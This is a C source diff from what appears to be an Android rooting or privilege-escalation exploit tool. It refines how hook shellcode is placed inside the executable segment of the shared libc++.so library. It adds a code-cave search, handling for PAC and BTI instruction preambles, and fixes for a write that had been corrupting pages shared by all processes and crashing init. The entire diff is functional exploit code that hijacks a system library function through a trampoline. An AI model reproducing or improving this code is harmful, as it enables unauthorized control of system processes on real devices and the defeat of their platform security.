@@ -5,9 +5,68 @@
 #include <linux/elf.h>
 #include "reporter.h"
 
+/* Shellcode placement, ported from upstream DFRoot 7a6513a (V3.0 logic).
+ *
+ * The e47ea6e parser wrote the hook shellcode blindly at the end of the
+ * executable segment. When that tail does not end exactly at a page
+ * boundary with enough slack, the write runs past the mapped exec page
+ * into the bytes that follow it in the file: shared libc++ data used by
+ * every process that has the library mapped. On the Android 17 / One UI
+ * 9.5 libc++.so that corrupted page killed an init-family process within
+ * a second of the run starting (issue #68: ueventd, comm init, SIGSEGV,
+ * "Attempted to kill init" panic) before the module ever loaded.
+ *
+ * The V3 placement keeps every written byte inside the executable mapping:
+ * use the tail only while it fits the rest of its page, otherwise use a
+ * zero run (alignment padding) inside the executable segment. The caller
+ * passes the 16-byte-padded shellcode size, so the padded write of the
+ * jmpback stub can never extend past the chosen placement either. */
+static int find_code_cave(int fd, uint64_t exec_off, uint64_t exec_filesz,
+                          uint64_t tail_off, size_t shellcode_size,
+                          uint64_t *out_off, struct Reporter *reporter) {
+    long pagesize = sysconf(_SC_PAGESIZE);
+    uint64_t page_off = tail_off & ((uint64_t)pagesize - 1);
+    uint64_t slack = page_off ? (uint64_t)pagesize - page_off : 0;
+    if (shellcode_size <= slack) {
+        REPORTLN("shellcode (%zu) fits the tail-page slack (%llu bytes)",
+                 shellcode_size, (unsigned long long)slack);
+        *out_off = tail_off;
+        return 0;
+    }
+
+    REPORTLN("shellcode (%zu) exceeds tail-page slack (%llu bytes), searching the segment",
+             shellcode_size, (unsigned long long)slack);
+    if (lseek64(fd, exec_off, SEEK_SET) < 0) return 1;
+    uint64_t run_start = 0, run_len = 0, max_run_len = 0;
+    char page[4096];
+    for (uint64_t done = 0; done < exec_filesz; done += sizeof(page)) {
+        size_t chunk = exec_filesz - done;
+        if (chunk > sizeof(page)) chunk = sizeof(page);
+        ssize_t n = read(fd, page, chunk);
+        if (n <= 0) break;
+        for (ssize_t i = 0; i < n; i++) {
+            if (page[i] == 0) {
+                if (!run_len) run_start = exec_off + done + (uint64_t)i;
+                if (++run_len >= shellcode_size) {
+                    REPORTLN("using code cave at 0x%llx", (unsigned long long)run_start);
+                    *out_off = run_start;
+                    return 0;
+                }
+                if (run_len > max_run_len) max_run_len = run_len;
+            } else {
+                run_len = 0;
+            }
+        }
+    }
+    REPORTLN("no code cave large enough in the segment (need %zu, largest %llu)",
+             shellcode_size, (unsigned long long)max_run_len);
+    return 1;
+}
+
 int find_hook_target(const char *libcxx, const char *symname,
                      uint64_t *hook_target, uint64_t *payload_target,
-                     uint32_t *first_instruction, struct Reporter *reporter) {
+                     uint32_t *first_instruction, size_t shellcode_size,
+                     struct Reporter *reporter) {
     *hook_target = 0;
     *payload_target = 0;
 
@@ -36,6 +95,7 @@ int find_hook_target(const char *libcxx, const char *symname,
     }
 
     uint64_t executable_off = 0;
+    uint64_t executable_filesz = 0;
     uint64_t executable_vaddr = 0;
     for (int i = 0; i < hdr.e_phnum; i++) {
         Elf64_Phdr phdr;
@@ -46,9 +106,14 @@ int find_hook_target(const char *libcxx, const char *symname,
         if (phdr.p_type == PT_LOAD && (phdr.p_flags & PF_X)) {
             *payload_target = phdr.p_offset + phdr.p_filesz;
             executable_off   = phdr.p_offset;
+            executable_filesz = phdr.p_filesz;
             executable_vaddr = phdr.p_vaddr;
             break;
         }
+    }
+    if (executable_off == 0 && executable_vaddr == 0) {
+        REPORTLN("no executable PT_LOAD segment found in %s", libcxx);
+        close(fd); return 1;
     }
 
     if (lseek64(fd, hdr.e_shoff + hdr.e_shstrndx * sizeof(Elf64_Shdr), SEEK_SET) < 0) {
@@ -111,8 +176,10 @@ int find_hook_target(const char *libcxx, const char *symname,
             close(fd); return 1;
         }
         name[sizeof(name) - 1] = 0;
-        if (strcmp(name, symname) == 0)
+        if (strcmp(name, symname) == 0) {
             *hook_target = sym.st_value - executable_vaddr + executable_off;
+            break;
+        }
     }
 
     if (*hook_target == 0) {
@@ -129,13 +196,37 @@ int find_hook_target(const char *libcxx, const char *symname,
         close(fd); return 1;
     }
 
-    if (*first_instruction == 0xd503233fU || *first_instruction == 0xd503245f) {
-        REPORTLN("PACIASP/BTI at hook site, advancing +4");
-        *hook_target += 4UL;
-        if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
-            REPORTLN("read first instruction +4 failed: %s", strerror(errno));
-            close(fd); return 1;
+    /* V3 preamble handling: One UI 9.5 libc++ functions open with PACIASP or
+     * PACIBSP and/or a BTI landing pad. The e47ea6e parser only recognized
+     * PACIASP and BTI c; a PACIBSP site left the signing instruction in place
+     * under the trampoline, and a function entered without its PACIBSP then
+     * failing its AUTIBSP on return also crashes the caller. Skip up to two
+     * preamble instructions so the trampoline lands on real code. */
+    for (int adv = 0; adv < 2; adv++) {
+        switch (*first_instruction) {
+        case 0xd503233fU: /* PACIASP */
+        case 0xd503237fU: /* PACIBSP */
+        case 0xd503241fU: /* BTI    */
+        case 0xd503245fU: /* BTI c  */
+        case 0xd503249fU: /* BTI j  */
+        case 0xd50324dfU: /* BTI jc */
+            REPORTLN("BTI/PAC preamble at hook site, advancing +4");
+            *hook_target += 4UL;
+            if (read(fd, first_instruction, sizeof(*first_instruction)) < 0) {
+                REPORTLN("read preamble +%d failed: %s", (adv + 1) * 4, strerror(errno));
+                close(fd); return 1;
+            }
+            continue;
+        default:
+            break;
         }
+        break;
+    }
+
+    if (find_code_cave(fd, executable_off, executable_filesz,
+                       *payload_target, shellcode_size, payload_target, reporter)) {
+        REPORTLN("no safe shellcode placement in %s", libcxx);
+        close(fd); return 1;
     }
 
     close(fd);
